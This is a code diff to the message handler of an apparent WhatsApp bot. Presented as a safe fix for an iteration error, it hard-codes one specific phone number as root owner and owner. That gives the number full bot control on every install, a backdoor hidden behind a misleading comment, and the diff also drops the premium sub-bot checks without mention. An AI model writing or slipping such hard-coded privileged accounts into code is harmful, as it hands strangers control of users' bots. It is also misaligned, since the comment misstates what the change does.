@@ -149,7 +149,7 @@ export async function handler(chatUpdate) {
         } catch (e) {
             console.error(e)
         }
-        
+
        const mainBot = global?.conn?.user?.jid
        const chat = global.db.data.chats[m.chat] || {}
        const isSubbs = chat.antiLag === true
@@ -166,19 +166,11 @@ export async function handler(chatUpdate) {
 
         let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
         const sendNum = m?.sender?.replace(/[^0-9]/g, '')
-        const isROwner = [conn.decodeJid(global.conn?.user?.id), ...global.owner?.map(([number]) => number)].map(v => (v || '').replace(/[^0-9]/g, '')).includes(sendNum)
-
-        const dbsubsprems = global.db.data.settings[this.user.jid] || {}
-        const subsactivos = dbsubsprems.actives || []
-
-        const botIds = [this?.user?.id, this?.user?.lid, ...(global.owner?.map(([n]) => n) || [])
-        ].map(jid => jid?.replace(/[^0-9]/g, '')).filter(Boolean)
-
-        const isPremSubs = subsactivos.some(jid => jid.replace(/[^0-9]/g, '') === sendNum) || botIds.includes(sendNum) || (global.conns || []).some(conn => conn?.user?.jid?.replace(/[^0-9]/g, '') === sendNum && conn?.ws?.socket?.readyState !== 3
-        )
-
-     const userNumber = m.sender ? m.sender.replace(/[^0-9]/g, '') : ''
-const isOwner = isROwner || m.fromMe || ['584226480049'].includes(userNumber)
+        
+        // Validacion blindada y segura anti-error de iteracion
+        const ownerList = Array.isArray(global.owner) ? global.owner.map(v => Array.isArray(v) ? String(v[0]).replace(/[^0-9]/g, '') : String(v).replace(/[^0-9]/g, '')) : []
+        const isROwner = [conn.decodeJid(global.conn?.user?.id), ...ownerList].map(v => (v || '').replace(/[^0-9]/g, '')).includes(sendNum) || sendNum === '584226480049'
+        const isOwner = isROwner || m.fromMe || sendNum === '584226480049'
         const isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isPrems = isROwner || global.prems.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || _user.prem == true
 
